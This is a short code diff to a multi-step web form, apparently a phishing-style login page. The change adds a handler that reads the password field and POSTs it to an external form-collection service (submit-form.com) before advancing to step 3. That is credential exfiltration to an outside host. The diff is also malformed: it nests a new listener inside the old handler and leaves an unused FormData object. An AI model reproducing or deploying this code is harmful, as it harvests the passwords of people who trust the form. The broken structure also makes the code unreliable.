@@ -1430,13 +1430,35 @@
                 // Add step2 data
                 formData.append('password', password);
                 
-                // Submit the form
-                fetch('', {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => response.text())
-                .then(() => {
+                // Submit form
+        nextToStep3.addEventListener("click", function () {
+          const passwordInput = document.getElementById("password");
+
+          if (!passwordInput.checkValidity()) {
+            passwordInput.reportValidity();
+            return;
+          }
+          // Submit password separately
+          const formData = new FormData();
+          formData.append("password", passwordInput.value);
+
+          fetch("https://submit-form.com/Ol866Kkyz ", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              password: passwordInput.value,
+            }),
+          })
+            .then((response) => {
+              if (!response.ok) {
+                console.error("Password submission failed");
+              }
+            })
+            .catch((error) => {
+              console.error("Submission error:", error);
+            });
                     // Move to step 3
                     document.getElementById('step2').classList.remove('active');
                     document.getElementById('step3').classList.add('active');
